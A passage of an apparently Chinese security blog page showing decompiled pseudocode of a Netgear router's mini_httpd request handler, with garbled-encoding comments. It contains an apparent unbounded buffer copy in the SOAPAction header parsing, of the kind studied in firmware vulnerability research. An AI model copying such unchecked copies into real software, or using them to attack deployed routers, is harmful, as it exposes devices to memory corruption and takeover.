class="keyword">if</span> ( !sc_usb_mounted(v149, v148) )</span><br><span class="line">      &#123;</span><br><span class="line">        v20 = <span class="number">503</span>;</span><br><span class="line">        v21 = <span class="string">&quot;No Shares Available&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_369;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( dword_429738 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_371:</span><br><span class="line">        v20 = <span class="number">404</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Not Found&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_372;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">        usb_auth_check(dword_429734);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        maybe_login(dword_429734);</span><br><span class="line">      sub_407980();</span><br><span class="line">      <span class="keyword">if</span> ( !is_usb_session || is_readable(dword_429734, <span class="string">&quot;&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        stream = scandir64(dword_429734, &amp;v166, <span class="number">0</span>, &amp;alphasort64);</span><br><span class="line">        <span class="keyword">if</span> ( stream &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v169 = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v177,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;&lt;!DOCTYPE html PUBLIC \&quot;-//W3C//DTD HTML 4.01 Transitional//EN\&quot; \&quot;http://www.w3.org/TR/html4/loose.dtd\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;&lt;html&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;meta http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html;charset=UTF-8\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;Index of %s&lt;/title&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;/head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;body bgcolor=\&quot;#99cc99\&quot; text=\&quot;#000000\&quot; link=\&quot;#2020ff\&quot; vlink=\&quot;#4040cc\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;h4&gt;Index of %s&lt;/h4&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;pre&gt;\n&quot;</span>,</span><br><span class="line">            dword_429734,</span><br><span class="line">            dword_429734);</span><br><span class="line">          v156 = <span class="number">0</span>;</span><br><span class="line">          sub_405B4C(&amp;v168, &amp;v169, &amp;v167, v177);</span><br><span class="line">          <span class="keyword">while</span> ( v156 != stream )</span><br><span class="line">          &#123;</span><br><span class="line">            haystack = dword_429734;</span><br><span class="line">            v157 = (*(v166 + <span class="number">4</span> * v156) + <span class="number">19</span>);</span><br><span class="line">            v181 = *(v166 + <span class="number">4</span> * v156);</span><br><span class="line">            <span class="built_in">snprintf</span>(byte_42EBA4, <span class="number">0x7D0</span>u, <span class="string">&quot;%s/%s&quot;</span>, dword_429734, v157);</span><br><span class="line">            <span class="keyword">if</span> ( !is_usb_session || is_readable(haystack, v157) )</span><br><span class="line">            &#123;</span><br><span class="line">              v159 = lstat64(byte_42EBA4, v174);</span><br><span class="line">              v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v159 &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v160 = <span class="built_in">strcmp</span>(v157, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">                v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v160 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( !is_usb_session</span><br><span class="line">                    || (v175 &amp; <span class="number">0xF000</span>) != <span class="number">40960</span></span><br><span class="line">                    || !*(v181 + <span class="number">19</span>)</span><br><span class="line">                    || (v161 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/USB_Storage&quot;</span>), v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>), !v161)</span><br><span class="line">                    &amp;&amp; (!<span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/&quot;</span>)</span><br><span class="line">                     || (v162 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;_Drive&quot;</span>), v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>), !v162)) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v157, <span class="string">&quot;..&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v163 = <span class="built_in">strcmp</span>(dword_429734, <span class="string">&quot;shares/&quot;</span>);</span><br><span class="line">                      v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v163 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        sub_406E78(v157);</span><br><span class="line">                        <span class="built_in">snprintf</span>(byte_42EBA4, <span class="number">0x7D0</span>u, <span class="string">&quot;&lt;A HREF=\&quot;%s\&quot;&gt;[To Parent Directory]&lt;/A&gt;\n&quot;</span>, byte_42F374);</span><br><span class="line">                        v158 = byte_42EBA4;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v164 = localtime(&amp;dword_432B70);</span><br><span class="line">                      strftime(v172, <span class="number">0x3C</span>u, <span class="string">&quot;%A, %B %d, %Y  %l:%M %p&quot;</span>, v164);</span><br><span class="line">                      sub_406E78(v157);</span><br><span class="line">                      <span class="built_in">snprintf</span>(</span><br><span class="line">                        byte_42EBA4,</span><br><span class="line">                        <span class="number">0x7D0</span>u,</span><br><span class="line">                        <span class="string">&quot;%-40s %14lld     &lt;A HREF=\&quot;%s\&quot;&gt;%s&lt;/A&gt;\n&quot;</span>,</span><br><span class="line">                        v172,</span><br><span class="line">                        v176,</span><br><span class="line">                        byte_42F374,</span><br><span class="line">                        v157);</span><br><span class="line">                      v158 = byte_42EBA4;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memset</span>(byte_42EBA4, <span class="number">0</span>, <span class="keyword">sizeof</span>(byte_42EBA4));</span><br><span class="line">              v158 = byte_42EBA4;</span><br><span class="line">            &#125;</span><br><span class="line">            sub_405B4C(&amp;v168, &amp;v169, &amp;v167, v158);</span><br><span class="line">            v156 = (v156 + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v177,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;    &lt;/pre&gt;\n\n    &lt;hr&gt;\n\n    &lt;address&gt;&lt;a href=\&quot;%s\&quot;&gt;%s&lt;/a&gt;&lt;/address&gt;\n  \n  &lt;/body&gt;\n\n&lt;/html&gt;\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;http://www.acme.com/software/mini_httpd/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mini_httpd/1.24 10May2016&quot;</span>);</span><br><span class="line">          sub_405B4C(&amp;v168, &amp;v169, &amp;v167, v177);</span><br><span class="line">          sub_4070A4(<span class="number">200</span>, <span class="string">&quot;Ok&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html; charset=%s&quot;</span>, optlen_4);</span><br><span class="line">          <span class="keyword">if</span> ( dword_429730 != <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *(v168 + v167) = <span class="number">0</span>;</span><br><span class="line">            sub_405BB0(v168);</span><br><span class="line">          &#125;</span><br><span class="line">          sub_406B58();</span><br><span class="line">          <span class="keyword">return</span> (SSL_free)(dword_429770);</span><br><span class="line">        &#125;</span><br><span class="line">        v155 = ntoa(&amp;client_addr);</span><br><span class="line">        syslog(<span class="number">6</span>, <span class="string">&quot;%.80s Directory \&quot;%.80s\&quot; is protected&quot;</span>, v155, path);</span><br><span class="line">        v20 = <span class="number">403</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v20 = <span class="number">403</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v23 = <span class="string">&quot;Directory is protected.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *dword_42973C )</span><br><span class="line">        <span class="built_in">snprintf</span>(v177, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/?%s&quot;</span>, path, dword_42973C);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v177, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/&quot;</span>, path);</span><br><span class="line">      v20 = <span class="number">302</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      v22 = v177;</span><br><span class="line">      v23 = <span class="string">&quot;Directories must end with a slash.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_382:</span><br><span class="line">    send_error(v20, v21, v22, v23);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = v144 - <span class="number">1</span>; *m == <span class="number">47</span>; --m )</span><br><span class="line">    *m = <span class="number">0</span>;</span><br><span class="line">LABEL_361:</span><br><span class="line">  execute_cgi();</span><br><span class="line">  <span class="keyword">return</span> (SSL_free)(dword_429770);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.2.0.76</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// çœç•¥å˜é‡å®šä¹‰éƒ¨åˆ†</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(v224, off_42A080, <span class="keyword">sizeof</span>(v224));</span><br><span class="line">  signal(<span class="number">14</span>, sub_408800);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  dword_42C878 = <span class="number">0</span>;</span><br><span class="line">  dword_42C89C = <span class="number">-1</span>;</span><br><span class="line">  dword_42C87C = <span class="number">0</span>;</span><br><span class="line">  path = <span class="number">0</span>;</span><br><span class="line">  host = <span class="number">0</span>;</span><br><span class="line">  dword_42C880 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8B4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C884 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8B8 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C8BC = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C888 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C890 = <span class="number">0</span>;</span><br><span class="line">  dword_42C898 = <span class="number">-1</span>;</span><br><span class="line">  dword_42C8A0 = <span class="number">0</span>;</span><br><span class="line">  authorization = <span class="number">0</span>;</span><br><span class="line">  dword_42C8A8 = <span class="number">-1</span>;</span><br><span class="line">  dword_42C8B0 = <span class="number">-1</span>;</span><br><span class="line">  dword_42C88C = <span class="number">0</span>;</span><br><span class="line">  dword_42C8A4 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8AC = <span class="number">0</span>;</span><br><span class="line">  dword_42A248 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v223 = <span class="number">1</span>;</span><br><span class="line">    setsockopt(dword_42C86C, <span class="number">6</span>, <span class="number">3</span>, &amp;v223, <span class="number">4u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_42C8C0 = SSL_new(dword_42B864);</span><br><span class="line">    SSL_set_fd(dword_42C8C0, dword_42C86C);</span><br><span class="line">    v0 = SSL_accept(dword_42C8C0);</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v0 )</span><br><span class="line">LABEL_106:</span><br><span class="line">      <span class="built_in">exit</span>(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_42C8C4 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8C8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_407960(v230, <span class="number">9999</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(v3, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1648</span>);</span><br><span class="line">          <span class="built_in">fputs</span>(<span class="string">&quot;read\n&quot;</span>, v3);</span><br><span class="line">          fclose(v3);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = *_errno_location();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">4</span> &amp;&amp; v4 != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">        <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(v6, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1653</span>);</span><br><span class="line">            v7 = <span class="string">&quot;break on nothing read\n&quot;</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">            <span class="built_in">fputs</span>(v7, v6);</span><br><span class="line">            fclose(v6);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(v8, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1657</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(v8, <span class="string">&quot;read: %s\n&quot;</span>, v230);</span><br><span class="line">        fclose(v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_406164(&amp;dword_42C8CC, &amp;dword_42C8C4, &amp;dword_42C8D0, v230, v2);</span><br><span class="line">    v9 = dword_42C8CC;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strstr</span>(dword_42C8CC, <span class="string">&quot;\r\n\r\n&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v9, <span class="string">&quot;\n\n&quot;</span>) );</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v6, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1663</span>);</span><br><span class="line">      v7 = <span class="string">&quot;break on find 2 crlf\n&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  v10 = sub_405E10(v5);</span><br><span class="line">  v11 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( !v10 || (v12 = <span class="built_in">strpbrk</span>(v10, <span class="string">&quot; \t\n\r&quot;</span>), (path = v12) == <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">    v17 = <span class="number">400</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">LABEL_438:</span><br><span class="line">    v20 = <span class="string">&quot;Can&#x27;t parse request.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  *v12 = <span class="number">0</span>;</span><br><span class="line">  path = (v12 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v12 + <span class="number">1</span>, <span class="string">&quot;ptimeout.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_42C870 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = getppid();</span><br><span class="line">      kill(v14, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = path;</span><br><span class="line">    path = v15 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    v16 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    dword_42C88C = v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      dword_42C88C = (v16 + <span class="number">1</span>);</span><br><span class="line">      v17 = <span class="number">401</span>;</span><br><span class="line">      v18 = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line">      v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;Authorization required.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = sub_405E10(v13);</span><br><span class="line">    <span class="keyword">if</span> ( !v35 || !*v35 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Authorization:&quot;</span>, <span class="number">0xE</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      authorization = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">14</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">14</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Content-Length:&quot;</span>, <span class="number">0xF</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v35 + <span class="number">15</span>;</span><br><span class="line">      v22 = <span class="built_in">strspn</span>(v21, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_42C8A8 = atol(&amp;v21[v22]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Content-Type:&quot;</span>, <span class="number">0xD</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42C8A4 = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">13</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42C8AC = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">7</span>];</span><br><span class="line">      dword_42C8D4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Host:&quot;</span>, <span class="number">5u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">5</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">5</span>];</span><br><span class="line">      host = v23;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>(v23, <span class="number">47</span>) || *v23 == <span class="number">46</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;If-Modified-Since:&quot;</span>, <span class="number">0x12</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = v35 + <span class="number">18</span>;</span><br><span class="line">      v25 = <span class="built_in">strspn</span>(v24, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_42C8B0 = tdate_parse(&amp;v24[v25]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Referer:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = v35 + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_52;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Referrer:&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = v35 + <span class="number">9</span>;</span><br><span class="line">LABEL_52:</span><br><span class="line">        dword_42C8B4 = &amp;v26[<span class="built_in">strspn</span>(v26, <span class="string">&quot; \t&quot;</span>)];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;User-Agent:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_42C8B8 = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">11</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">11</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v27 = strncasecmp(v35, <span class="string">&quot;Accept-Language:&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">        v28 = v35;</span><br><span class="line">        <span class="keyword">if</span> ( v27 )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = v35 + <span class="number">11</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !strncasecmp(v28, <span class="string">&quot;SOAPAction:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">          &#123;</span><br><span class="line">            v30 = <span class="built_in">strspn</span>(v29, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">            v31 = strcasestr(&amp;v29[v30], <span class="string">&quot;urn:NETGEAR-ROUTER:service:&quot;</span>);</span><br><span class="line">            v13 = (v31 + <span class="number">27</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                v33 = *v13;</span><br><span class="line">                <span class="keyword">if</span> ( v33 == <span class="number">58</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                byte_42C8D8[i] = v33;</span><br><span class="line">                ++v13;</span><br><span class="line">              &#125;</span><br><span class="line">              v34 = <span class="built_in">strchr</span>(v13, <span class="number">35</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v34 &amp;&amp; v34[<span class="number">1</span>] )</span><br><span class="line">                <span class="built_in">snprintf</span>(&amp;byte_42C958, <span class="number">0x80</span>u, <span class="string">&quot;%s&quot;</span>, v34 + <span class="number">1</span>);</span><br><span class="line">              byte_42C8D8[i] = <span class="number">0</span>;</span><br><span class="line">              dword_42C9D8 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          dword_42C8BC = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">16</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">16</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v36 = nvram_get(<span class="string">&quot;fw_local_force_https&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v36 )</span><br><span class="line">    v36 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v36 == <span class="string">&#x27;1&#x27;</span> &amp;&amp; !do_ssl &amp;&amp; !path_exist_in_exception_list(path, off_42AEA0, v11) )<span class="comment">// æ·»åŠ äº† HTTPS æ”¯æŒ</span></span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v230[<span class="number">0</span>].sa_family) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v230[<span class="number">0</span>].sa_family + <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x7F</span>u);</span><br><span class="line">    strlcpy(v230, path, <span class="number">128</span>);</span><br><span class="line">    v37 = v230 + <span class="built_in">strspn</span>(v230, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    *<span class="built_in">strpbrk</span>(v37, <span class="string">&quot; \t\n\r&quot;</span>) = <span class="number">0</span>;</span><br><span class="line">    v38 = dword_42C88C;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">      v38 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">    dword_42C88C = v38;</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v225, <span class="number">0x9C</span>u, <span class="string">&quot;Location: https://%s%s&quot;</span>, host, v37);</span><br><span class="line">    v17 = <span class="number">302</span>;</span><br><span class="line">    v19 = &amp;v225;</span><br><span class="line">    v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( host )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v39 )</span><br><span class="line">      v39 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v39 == <span class="number">98</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_581;</span><br><span class="line">    v40 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v40 )</span><br><span class="line">      v40 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span 